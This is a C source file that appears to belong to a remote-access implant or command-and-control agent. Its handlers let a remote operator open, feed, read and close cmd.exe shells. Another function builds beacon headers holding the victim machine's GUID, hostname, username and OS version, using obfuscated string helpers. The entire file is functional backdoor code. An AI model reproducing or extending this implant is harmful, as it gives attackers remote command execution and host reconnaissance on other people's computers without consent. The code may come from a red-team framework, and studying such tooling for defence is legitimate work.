#include "commands.h"
#include "system_facts.h"
#include "wire.h"
#include "stackstrings.h"

DWORD Handle_ShellOpen(const agent_ctx *ctx, unsigned int corr_id, unsigned char *reply, DWORD *reply_len){
     int id = shell_open(ctx->shells);

    if (id < 0) {
        unsigned char status_error[8];
        MemoryZero(status_error, sizeof(status_error));

        write_u32_le_at(status_error, 4, corr_id);

        MemoryCopy(reply, status_error, sizeof(status_error));
        *reply_len = sizeof(status_error);
        
        LOG_ERROR("OpenShell failed - replied status 1 (corr=%u)", corr_id);
        return STATUS_ERROR;
    }

    int pos = 0;
    write_u32_le(reply, &pos, STATUS_OK);
    write_u32_le(reply, &pos, corr_id);
    write_u64_le(reply, &pos, (unsigned long long)id);

    *reply_len = 16;
    LOG_INFO("Shell with ID %d opened (cmd.exe spawned)", id);
    return STATUS_OK;
}

DWORD Handle_ShellWrite(const agent_ctx *ctx, const incoming_message *msg, unsigned int corr_id, unsigned char *reply, DWORD *reply_len){
    unsigned long long id = 0;
    for (int i = 12; i >= 5; i--)
        id = (id << 8) | msg->data[i];

    shell_slot *slot = shell_lookup(ctx->shells, id);

    int status = STATUS_ERROR;
    if (slot) {
        DWORD end = msg->length;
        while (end > 13 && msg->data[end - 1] == '\0')
            end--;
        if (end > 13 && shell_write(slot, msg->data + 13, end - 13) == 0)
            status = STATUS_OK;
    }

    int pos = 0;
    write_u32_le(reply, &pos, (DWORD)status);
    write_u32_le(reply, &pos, corr_id);
    *reply_len = 8;
    LOG_INFO("Write to shell %u: %lu byte(s)", (UINT32)id, (unsigned long)(msg->length - 13));
    return (DWORD)status;
}

DWORD Handle_ShellRead(const agent_ctx *ctx, const incoming_message *msg, unsigned int corr_id, unsigned char *reply, DWORD *reply_len){
        unsigned long long id = 0;
    for (int i = 12; i >= 5; i--)
        id = (id << 8) | msg->data[i];

    shell_slot *slot = shell_lookup(ctx->shells, id);
    if (!slot) {
        unsigned char status_error[8];
        MemoryZero(status_error, sizeof(status_error));

        write_u32_le_at(status_error, 4, corr_id);
        MemoryCopy(reply, status_error, sizeof(status_error));

        *reply_len = sizeof(status_error);
        LOG_ERROR("Read shell with ID %u - unknown ID, replied status 1 (corr=%u)", (UINT32)id, corr_id);
        return STATUS_ERROR;
    }

    unsigned char chunk[8 + SHELL_READ_CHUNK + 1];
    DWORD got = 0;
    int r = shell_read(slot, chunk + 8, SHELL_READ_CHUNK, &got);

    if (r == SHELL_READ_DEAD) {
        unsigned char status_error[8];
        MemoryZero(status_error, sizeof(status_error));

        write_u32_le_at(status_error, 4, corr_id);
        MemoryCopy(reply, status_error, sizeof(status_error));
        *reply_len = sizeof(status_error);

        LOG_ERROR("Shell %llu exited - status 1, slot freed (corr=%u)", id, corr_id);
        return STATUS_ERROR;
    }

    int pos = 0;
    write_u32_le(chunk, &pos, STATUS_OK);
    write_u32_le(chunk, &pos, corr_id);

    chunk[8 + got] = '\0';
    MemoryCopy(reply, chunk, 8 + got + 1);

    *reply_len = 8 + got + 1;

    if (r == SHELL_READ_IDLE)
        LOG_INFO("Read shell with ID %u - idle", (UINT32)id);
    else
        LOG_INFO("Read shell with ID %u - %lu byte(s)", (UINT32)id, (unsigned long)got);

    return STATUS_OK;
}

DWORD Handle_ShellClose(const agent_ctx *ctx, const incoming_message *msg, unsigned int corr_id, unsigned char *reply, DWORD *reply_len){
    unsigned long long id = 0;
    for (int i = 12; i >= 5; i--)
        id = (id << 8) | msg->data[i];

    shell_slot *slot = shell_lookup(ctx->shells, id);
    if (slot) {
        shell_teardown(slot);
        LOG_INFO("Shell with ID %u closed (cmd.exe terminated)", (UINT32)id);
    } else {
        LOG_INFO("Close shell with ID %u - not open (still ok)", (UINT32)id);
    }

    int pos = 0;
    write_u32_le(reply, &pos, STATUS_OK);
    write_u32_le(reply, &pos, corr_id);
    *reply_len = 8;
    return STATUS_OK;
}


USIZE Handle_IdentityHeaders(CHAR headers[IDENTITY_HEADERS_SIZE])
{
    hwriter w = { headers, headers + IDENTITY_HEADERS_SIZE, 1 };
    CHAR piece[64];

    StrHdrApiVersion(piece);  hw_puts(&w, piece);  hw_crlf(&w);
    StrHdrNameId(piece);      hw_puts(&w, piece);  hw_crlf(&w);
    StrHdrPlatform(piece);    hw_puts(&w, piece);  hw_crlf(&w);
    StrHdrCaps(piece);        hw_puts(&w, piece);  hw_crlf(&w);

    CHAR guid_text[40];
    if (read_machine_guid_text(guid_text)) {
        StrLblUuid(piece);
        hw_header(&w, piece, guid_text);
    }

    system_facts facts;
    collect_system_facts(&facts);

    StrLblHostname(piece);
    if (facts.hostname[0] != '\0')
        hw_header(&w, piece, facts.hostname);

    StrLblUsername(piece);
    if (facts.username[0] != '\0')
        hw_header(&w, piece, facts.username);

#if defined(ENVIRONMENT_x86_64) || defined(__x86_64__) || defined(_M_X64)
    StrValArchX64(piece);
#elif defined(ENVIRONMENT_ARM64) || defined(__aarch64__) || defined(_M_ARM64)
    StrValArchArm64(piece);
#else
    StrValArchI386(piece);
#endif
    hw_puts(&w, piece);  hw_crlf(&w);

    StrLblOsVersion(piece);
    if (facts.os_version[0] != '\0')
        hw_header(&w, piece, facts.os_version);

    StrLblBuild(piece);
    hw_puts(&w, piece);
    hw_u32_decimal(&w, (UINT32)ID_BUILD_NUMBER);
    hw_crlf(&w);

    StrLblCommit(piece);
    StrCommitDefault(piece + 32);
    hw_header(&w, piece, piece + 32);

    if (!w.ok)
        return 0;

    if (w.cur >= w.end)
        return 0;
    *w.cur = '\0';
    return (USIZE)(w.cur - headers);
}
